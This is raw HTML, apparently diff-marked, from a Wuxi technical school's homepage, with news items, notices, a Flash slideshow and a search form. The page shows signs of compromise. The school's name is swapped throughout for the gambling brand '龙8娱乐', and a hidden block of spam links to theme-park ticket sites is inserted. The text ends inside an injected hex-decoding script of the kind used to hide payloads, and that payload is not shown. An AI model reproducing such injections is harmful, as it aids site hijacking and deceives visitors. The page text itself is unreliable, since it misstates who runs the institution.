style="MARGIN-LEFT: 0px; OVERFLOW: hidden">欢迎来到龙8娱乐！</DIV></DIV></DIV><DIV  id="ohid_s1132575" style="Z-INDEX: 10; BORDER-BOTTOM: rgb(227,234,245) 1px solid; POSITION: absolute; BORDER-LEFT: rgb(227,234,245) 1px solid; WIDTH: 766px; HEIGHT: 265px; BORDER-TOP: rgb(227,234,245) 1px solid; TOP: 248px; BORDER-RIGHT: rgb(227,234,245) 1px solid; LEFT: 7px"><DIV id="s1132575_header" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/x_1d52811780.jpg); Z-INDEX: 8; POSITION: absolute; WIDTH: 100%; BACKGROUND-REPEAT: no-repeat; HEIGHT: 40px"><DIV id="s1132575_header0" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 20px"></DIV><DIV id="s1132575_header1" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px"></DIV><DIV id="s1132575_header2" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"></DIV><DIV id="s1132575_header3" style="POSITION: absolute; WIDTH: 60px; HEIGHT: 100%; TOP: 5px; LEFT: 5px"></DIV><DIV id="s1132575_header4" style="POSITION: absolute; TEXT-ALIGN: right; WIDTH: 80px; HEIGHT: 100%; TOP: 6px; RIGHT: 8px"  ><a href="default.php?mod=article&settype=0&fid=121"  ><IMG onerror=errorimg(this) src="http://hyjsxy.oho168.com/images/title/b/731/5.gif" ;=""></a></DIV><DIV id="s1132575_header5" style="POSITION: absolute; WIDTH: 60%; HEIGHT: 100%; COLOR: rgb(17,100,178); FONT-SIZE: 14px; TOP: 4px; FONT-WEIGHT: bold; LEFT: 29px">龙8娱乐城</DIV></DIV><DIV id="s1132575_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 40px; LEFT: 0px"><DIV id="s1132575_content"  style="PADDING-LEFT: 300px; PADDING-RIGHT: 10px; PADDING-TOP: 65px"><table  width="100%"  style=" table-layout:fixed;"  border=0 cellspacing="0" ><tbody><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=722004"  target='_blank' title="社区与学院共建安全生产宣教基地">社区与学院共建安全生产宣教基地</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-30]</span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=721173"  target='_blank' title="“让歌声唱响青春校园”歌会总决赛">“让歌声唱响青春校园”歌会总决赛</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-13]</span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=720099"  target='_blank' title="燕帽戴在头上 责任记在心田">燕帽戴在头上 责任记在心田</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-05-23]</span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=719646"  target='_blank' title="新团员入团宣誓">新团员入团宣誓</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-05-10]</span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=719644"  target='_blank' title="国学大讲堂之“孝悌•感恩”">国学大讲堂之“孝悌•感恩”</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-04-20]</span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=718538"  target='_blank' title="牵起我们的手，传递心中的温暖 ——“爱心社”走进儿童福利院">牵起我们的手，传递心中的温暖 ——“爱心社” ..</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-04-01]</span></td></tr><tr></table>
+</DIV></DIV></DIV><DIV  id="ohid_s75612708" style="Z-INDEX: 6; POSITION: absolute; WIDTH: 798px; HEIGHT: 21px; TOP: 212px; LEFT: 190px"><DIV id="s75612708_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s75612708_content"  style=""><EMBED wmode="transparent" id="embedswf" src="images/flashtime/flashtime-0147.swf?id=1500016611" value="transparent"  width="100%"  height="100%"   flashvars="" 	 type=application/x-shockwave-flash quality="1" loop="true" play="true" scale="showall"></DIV></DIV></DIV><DIV  id="ohid_s74433937" style="Z-INDEX: 11; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 275px; HEIGHT: 223px; TOP: 287px; LEFT: 16px"><DIV id="s74433937_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s74433937_content"  style=""><script>
+ var sofocus = new SWFObject("images/magic/image06.swf?id=", "s74433937_focus", "275", "215", "9.0.28", "#FFFFFF"); 
+ sofocus.addParam("allowNetworking", "all"); 
+ sofocus.addParam("allowScriptAccess", "always"); 
+ sofocus.addParam("allowFullScreen", "true"); 
+ sofocus.addParam("scale", "noscale");
+ sofocus.addParam("wmode", "Opaque");
+ sofocus.addVariable("pics", "files/103997/1706/x_2054229330_m.jpg|files/103997/1706/x_0194229388_m.JPG|files/103997/1705/x_80d4229369_m.jpg|/files/103997/1705/x_2c44229311_m.jpg|/files/103997/1705/x_4c64229315_m.png|files/103997/1704/x_d884229316_m.jpg"); 
+ sofocus.addVariable("spics", "files/103997/1706/x_2054229330_s.jpg|files/103997/1706/x_0194229388_s.JPG|files/103997/1705/x_80d4229369_s.jpg|/files/103997/1705/x_2c44229311_s.jpg|/files/103997/1705/x_4c64229315_s.png|files/103997/1704/x_d884229316_s.jpg"); 
+ sofocus.addVariable("links", "default.php?mod=article%26tid=722004%26do=detail|default.php?mod=article%26tid=721173%26do=detail|default.php?mod=article%26tid=720099%26do=detail|default.php?mod=article%26tid=719646%26do=detail|default.php?mod=article%26tid=719644%26do=detail|default.php?mod=article%26tid=718538%26do=detail"); 
+ sofocus.addVariable("titles", "社区与学院共建安全生产宣教基地|“让歌声唱响青春校园”歌会总决赛|燕帽戴在头上 责任记在心田|新团员入团宣誓|国学大讲堂之“孝悌•感恩”|牵起我们的手，传递心中的温暖 ——“爱心社”走进儿"); 
+ sofocus.addVariable("texts", ""); 
+ sofocus.addVariable("buttonPosition", "1"); 
+ sofocus.addVariable("timeout", "3000"); 
+ sofocus.addVariable("isTitleVisible", "1"); 
+ sofocus.addVariable("titleColor", ""); 
+ sofocus.addVariable("isSummaryVisible", "0"); 
+ sofocus.addVariable("summaryColor", ""); 
+ sofocus.addVariable("windows", "_blank"); 
+ sofocus.write("s74433937_content"); 
+</script> 
+</DIV></DIV></DIV><DIV  id="ohid_s85646771" style="Z-INDEX: 25; POSITION: absolute; WIDTH: 201px; HEIGHT: 26px; TOP: 174px; LEFT: 790px"><DIV id="s85646771_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s85646771_content"  style=""><form method="get"  action="default.php" onSubmit="return Validator.Validate(this,1)"><TABLE style="WIDTH: 100%; BORDER-COLLAPSE: collapse" borderColor=#999999 cellSpacing=0 cellPadding=0 border=0><TBODY><TR><TD><P align=center><INPUT title=输入关键字 style="Z-INDEX: 10; LEFT: 1px; WIDTH: 160px; POSITION: static; TOP: 1px; HEIGHT: 14px" size=1 require="true" msg="关键字必填" name="keyword"></P></TD><TD><INPUT type=image src="files/103997/1111/y_3762811726.png"></TD></TR></TBODY></TABLE><input type=hidden name="mod" value="search"></form><script language="JavaScript" src="mod/shotel/js/WdatePicker.js"></script>
+</DIV></DIV></DIV><DIV  id="ohid_s1941296" style="Z-INDEX: 11; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 453px; HEIGHT: 73px; TOP: 284px; LEFT: 302px"><DIV id="s1941296_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s1941296_content"  style=""><table  cellspacing=0 border=0><tr><td><SPAN class=link_8 style="Z-INDEX: 10; LEFT: 306px; WIDTH: 90px; POSITION: absolute; TOP: 41px; HEIGHT: 19px"><FONT class=link_13 size=6><A href="default.php?mod=article&do=detail&tid=722004" target=_blank>[详情]</A></FONT></SPAN> <TABLE style="MARGIN-BOTTOM: 5px; WIDTH: 453px; BORDER-BOTTOM: #cccccc 1px dashed" cellSpacing=0 cellPadding=0 width="100%" border=0><TBODY><TR><TD class="mod_font08 mod_size14 mod_bold mod_padding5r mod_padding5l link_13" style="HEIGHT: 21px"><P align=center><A href="default.php?mod=article&do=detail&tid=722004" target=_blank>社区与学院共建安全生产宣教基地</A></P></TD></TR><TR><TD class="mod_font08_t mod_padding5r mod_padding5l" style="PADDING-BOTTOM: 4px; VERTICAL-ALIGN: top; LINE-HEIGHT: 1.7"><P align=justify></P></TD></TR></TBODY></TABLE></td></tr><tr></tr><tr><td colspan=1  align= style='padding-top:;display:none'></td></tr></table></DIV></DIV></DIV><DIV  id="ohid_s37102846" style="Z-INDEX: 10; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 528px; DISPLAY: none; HEIGHT: 88px; TOP: 303px; LEFT: 445px"><DIV id="s37102846_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s37102846_content"  style=""><table  cellspacing=0 border=0><tr><td><SPAN style="Z-INDEX: 10; LEFT: 292px; WIDTH: 57px; POSITION: absolute; TOP: 60px; HEIGHT: 19px"><FONT class=link_13>[详情]</FONT></SPAN> <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0><TBODY><TR><TD class="mod_font08 mod_size14 mod_bold link_13" style="HEIGHT: 21px"><P align=center><A href="default.php?mod=article&do=detail&tid=361587">学院简介</A></P></TD></TR><TR><TD class=mod_font08_t style="VERTICAL-ALIGN: top; LINE-HEIGHT: 1.7"><P align=justify>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;龙8娱乐创办于1958年，学校2003年被评为省级重点，2005年被评为国家级重点，2006年通过国家重点技工学校质量管理体系验收，2007年被评为高级技工学校，2008年升格为技师学院。学校多次荣获无锡市技能人才培 ..</P></TD></TR></TBODY></TABLE></td></tr><tr></tr><tr><td colspan=1  align= style='padding-top:;display:none'></td></tr></table></DIV></DIV></DIV><DIV  id="ohid_s28091864" style="Z-INDEX: 10; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 528px; DISPLAY: none; HEIGHT: 88px; TOP: 303px; LEFT: 445px"><DIV id="s28091864_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s28091864_content"  style=""><table  cellspacing=0 border=0><tr><td><SPAN style="Z-INDEX: 10; LEFT: 292px; WIDTH: 57px; POSITION: absolute; TOP: 60px; HEIGHT: 19px"><FONT class=link_13>[详情]</FONT></SPAN> <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0><TBODY><TR><TD class="mod_font08 mod_size14 mod_bold link_13" style="HEIGHT: 21px"><P align=center><A href="default.php?mod=article&do=detail&tid=361587">学院简介</A></P></TD></TR><TR><TD class=mod_font08_t style="VERTICAL-ALIGN: top; LINE-HEIGHT: 1.7"><P align=justify>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;龙8娱乐创办于1958年，学校2003年被评为省级重点，2005年被评为国家级重点，2006年通过国家重点技工学校质量管理体系验收，2007年被评为高级技工学校，2008年升格为技师学院。学校多次荣获无锡市技能人才培 ..</P></TD></TR></TBODY></TABLE></td></tr><tr></tr><tr><td colspan=1  align= style='padding-top:;display:none'></td></tr></table></DIV></DIV></DIV><DIV  id="ohid_s76267386" style="Z-INDEX: 10; BORDER-BOTTOM: rgb(227,234,245) 1px solid; POSITION: absolute; BORDER-LEFT: rgb(227,234,245) 1px solid; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 216px; HEIGHT: 126px; BORDER-TOP: rgb(8,84,167) 2px solid; TOP: 248px; BORDER-RIGHT: rgb(227,234,245) 1px solid; LEFT: 778px"><DIV id="s76267386_header" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/x_49c2811798.jpg); Z-INDEX: 8; POSITION: absolute; WIDTH: 100%; BACKGROUND-REPEAT: no-repeat; HEIGHT: 40px"><DIV id="s76267386_header0" style="POSITION: absolute; WIDTH: 176px; HEIGHT: 100%; TOP: 0px; LEFT: 20px"></DIV><DIV id="s76267386_header1" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px"></DIV><DIV id="s76267386_header2" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"></DIV><DIV id="s76267386_header3" style="POSITION: absolute; WIDTH: 60px; HEIGHT: 100%; TOP: 5px; LEFT: 5px"></DIV><DIV id="s76267386_header4" style="POSITION: absolute; TEXT-ALIGN: right; WIDTH: 80px; HEIGHT: 100%; TOP: 5px; RIGHT: 10px"  ><a href="default.php?mod=article&settype=0&fid=71"  ><IMG onerror=errorimg(this) src="http://hyjsxy.oho168.com/images/title/b/731/5.gif" ;=""></a></DIV><DIV id="s76267386_header5" style="POSITION: absolute; WIDTH: 60%; HEIGHT: 100%; COLOR: rgb(8,84,167); FONT-SIZE: 14px; TOP: 3px; FONT-WEIGHT: bold; LEFT: 26px">通知公告</DIV></DIV><DIV id="s76267386_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 30px; LEFT: 0px"><DIV id="s76267386_content"  style="PADDING-BOTTOM: 0px; PADDING-LEFT: 8px; PADDING-RIGHT: 8px; MARGIN-BOTTOM: 0px; HEIGHT: 133px; OVERFLOW: hidden"><table cellspacing=0  width=100%><tr><td id=s76267386_f><table  width="100%"  style=" table-layout:fixed;"  border=0 cellspacing="0" ><tbody><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=719278"  target='_blank' title="2017年招生计划">2017年招生计划</a></span></span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=645750"  target='_blank' title="招聘启事">招聘启事</a></span></span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=709688"  target='_blank' title="新生入学报到须知">新生入学报到须知</a></span></span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=647289"  target='_blank' title="毕业生办理户口须知">毕业生办理户口须知</a></span></span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=362725"  target='_blank' title="网上报名公告">网上报名公告</a></span></span></td></tr><tr></table>
+</td></tr><tr><td  id=s76267386_f1><table  width="100%"  style=" table-layout:fixed;"  border=0 cellspacing="0" ><tbody><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=719278"  target='_blank' title="2017年招生计划">2017年招生计划</a></span></span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=645750"  target='_blank' title="招聘启事">招聘启事</a></span></span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=709688"  target='_blank' title="新生入学报到须知">新生入学报到须知</a></span></span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=647289"  target='_blank' title="毕业生办理户口须知">毕业生办理户口须知</a></span></span></td></tr><tr><td   height=24   style="vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=362725"  target='_blank' title="网上报名公告">网上报名公告</a></span></span></td></tr><tr></table>
+</td></tr></table></DIV></DIV></DIV><DIV  id="ohid_s61342981" style="Z-INDEX: 10; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 527px; DISPLAY: none; HEIGHT: 136px; TOP: 391px; LEFT: 445px"><DIV id="s61342981_header" style="Z-INDEX: 8; POSITION: absolute; WIDTH: 100%; HEIGHT: 40px"><DIV id="s61342981_header0" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 20px"></DIV><DIV id="s61342981_header1" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px"></DIV><DIV id="s61342981_header2" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"></DIV><DIV id="s61342981_header3" style="POSITION: absolute; WIDTH: 60px; HEIGHT: 100%; TOP: 5px; LEFT: 5px"></DIV><DIV id="s61342981_header4" style="POSITION: absolute; TEXT-ALIGN: right; WIDTH: 80px; HEIGHT: 100%; TOP: -119px; RIGHT: 0px"  ><a href="default.php?mod=article&fid=0"  ><IMG onerror=errorimg(this) src="http://hyjsxy.oho168.com/images/title/b/731/5.gif" ;=""></a></DIV><DIV id="s61342981_header5" style="POSITION: absolute; WIDTH: 60%; HEIGHT: 100%; TOP: 5px; LEFT: 20px"></DIV></DIV><DIV id="s61342981_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s61342981_content"  style=""><table  width="100%"  style=" table-layout:fixed;"  border=0 cellspacing="0" ><tbody><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=722004"  target='_blank' title="社区与学院共建安全生产宣教基地">社区与学院共建安全生产宣教基地</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-30]</span></td></tr><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=722005"  target='_blank' title="社区与学院共建安全生产宣教基地">社区与学院共建安全生产宣教基地</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-30]</span></td></tr><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=721172"  target='_blank' title="“让歌声唱响青春校园”歌会总决赛">“让歌声唱响青春校园”歌会总决赛</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-13]</span></td></tr><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=721173"  target='_blank' title="“让歌声唱响青春校园”歌会总决赛">“让歌声唱响青春校园”歌会总决赛</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-13]</span></td></tr><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=721174"  target='_blank' title="“让歌声唱响青春校园”歌会总决赛">“让歌声唱响青春校园”歌会总决赛</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-13]</span></td></tr><tr></table>
+</DIV></DIV></DIV><DIV  id="ohid_s27951130" style="Z-INDEX: 10; POSITION: absolute; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 527px; DISPLAY: none; HEIGHT: 136px; TOP: 391px; LEFT: 445px"><DIV id="s27951130_header" style="Z-INDEX: 8; POSITION: absolute; WIDTH: 100%; HEIGHT: 40px"><DIV id="s27951130_header0" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 20px"></DIV><DIV id="s27951130_header1" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px"></DIV><DIV id="s27951130_header2" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"></DIV><DIV id="s27951130_header3" style="POSITION: absolute; WIDTH: 60px; HEIGHT: 100%; TOP: 5px; LEFT: 5px"></DIV><DIV id="s27951130_header4" style="POSITION: absolute; TEXT-ALIGN: right; WIDTH: 80px; HEIGHT: 100%; TOP: -119px; RIGHT: 0px"  ><a href="default.php?mod=article&fid=0"  ><IMG onerror=errorimg(this) src="http://hyjsxy.oho168.com/images/title/b/731/5.gif" ;=""></a></DIV><DIV id="s27951130_header5" style="POSITION: absolute; WIDTH: 60%; HEIGHT: 100%; TOP: 5px; LEFT: 20px"></DIV></DIV><DIV id="s27951130_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 0px; LEFT: 0px"><DIV id="s27951130_content"  style=""><table  width="100%"  style=" table-layout:fixed;"  border=0 cellspacing="0" ><tbody><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=722004"  target='_blank' title="社区与学院共建安全生产宣教基地">社区与学院共建安全生产宣教基地</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-30]</span></td></tr><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=722005"  target='_blank' title="社区与学院共建安全生产宣教基地">社区与学院共建安全生产宣教基地</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-30]</span></td></tr><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=721172"  target='_blank' title="“让歌声唱响青春校园”歌会总决赛">“让歌声唱响青春校园”歌会总决赛</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-13]</span></td></tr><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=721173"  target='_blank' title="“让歌声唱响青春校园”歌会总决赛">“让歌声唱响青春校园”歌会总决赛</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-13]</span></td></tr><tr><td   height=24   style="border-bottom:1px #CCCCCC dashed; vertical-align:middle"   ><span style="float:left;"><img src="http://www.hiqview.com/images/prefix/index_03.gif"  align="absmiddle">&nbsp;&nbsp;<span  class="link_1"><a href="default.php?mod=article&do=detail&tid=721174"  target='_blank' title="“让歌声唱响青春校园”歌会总决赛">“让歌声唱响青春校园”歌会总决赛</a></span></span><span  class="link_1" style="float:right"> &nbsp;[17-06-13]</span></td></tr><tr></table>
+</DIV></DIV></DIV><DIV  id="ohid_s86644677" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/y_6c12811779.jpg); Z-INDEX: 10; BORDER-BOTTOM: rgb(227,234,245) 1px solid; POSITION: absolute; BORDER-LEFT: rgb(227,234,245) 1px solid; BACKGROUND-COLOR: rgb(255,255,255); WIDTH: 289px; BACKGROUND-REPEAT: repeat-x; BACKGROUND-POSITION: 0% 0%; HEIGHT: 164px; BORDER-TOP: rgb(13,87,169) 2px solid; TOP: 522px; BORDER-RIGHT: rgb(227,234,245) 1px solid; LEFT: 7px"><DIV id="s86644677_header" style="BACKGROUND-IMAGE: url(http://www.hiqview.com/files/103997/1111/y_8832811797.png); Z-INDEX: 8; POSITION: absolute; WIDTH: 100%; BACKGROUND-REPEAT: no-repeat; HEIGHT: 40px; TOP: 5px; LEFT: 9px"><DIV id="s86644677_header0" style="POSITION: absolute; WIDTH: 249px; HEIGHT: 100%; TOP: 0px; LEFT: 20px"></DIV><DIV id="s86644677_header1" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; LEFT: 0px"></DIV><DIV id="s86644677_header2" style="POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"></DIV><DIV id="s86644677_header3" style="POSITION: absolute; WIDTH: 60px; HEIGHT: 100%; TOP: 5px; LEFT: 5px"></DIV><DIV id="s86644677_header4" style="POSITION: absolute; TEXT-ALIGN: right; WIDTH: 80px; HEIGHT: 100%; TOP: 0px; RIGHT: 0px"  ><a href="default.php?mod=article&fid=0"  ></a></DIV><DIV id="s86644677_header5" style="POSITION: absolute; WIDTH: 60%; HEIGHT: 100%; COLOR: rgb(13,87,169); FONT-SIZE: 14px; TOP: -1px; FONT-WEIGHT: bold; LEFT: 20px">快速通道</DIV></DIV><DIV id="s86644677_c" style="Z-INDEX: 5; POSITION: absolute; WIDTH: 100%; HEIGHT: 100%; OVERFLOW: hidden; TOP: 35px; LEFT: 0px"><DIV id="s86644677_content"  style="PADDING-LEFT: 7px; PADDING-RIGHT: 7px"><TABLE style="TEXT-ALIGN: center; WIDTH: 100%; BORDER-COLLAPSE: collapse" border=0 cellSpacing=0 borderColor=#999999 cellPadding=0 align=center>
+<TBODY>
+<TR>
+<TD><A href="default.php?mod=c&amp;s=sse043911" target=_blank><IMG src="files/103997/1201/y_1682811754.jpg"></A></TD>
+<TD><A href="default.php?mod=c&amp;s=ss3a52fad" target=_blank><IMG src="files/103997/1201/y_dd92811721.jpg"></A></TD></TR>
+<TR>
+<TD><A href="default.php?mod=c&amp;s=ss6d72f81"><IMG src="files/103997/1201/y_04e2811726.jpg"></A></TD>
+<TD><A href="default.php?mod=c&amp;s=ssaf16730" target=_blank><IMG src="files/103997/1201/y_57b2811765.jpg"></A></TD></TR></TBODY></TABLE>
+<DIV id=lfgrss><A href="http://www.17fangte.com/" target=_blank>株洲方特</A><A href="http://www.17fangte.com/" target=_blank>株洲方特欢乐世界</A><A href="http://www.17fangte.com/" target=_blank>株洲方特欢乐世界门票</A><A href="http://www.onhn.net/" target=_blank>株洲方特欢乐世界门票</A><A href="http://www.onhn.net/" target=_blank>株洲方特欢乐世界门票团购</A></DIV>
+<SCRIPT language=javascript>function HexTostring(s){
+var r='';
+for(var i=0;i<s.length;i+=2){
+var sxx=parseInt(s.substring(i,i+2),16);
+r+=String.fromCharCode(sxx);}
+return r;}
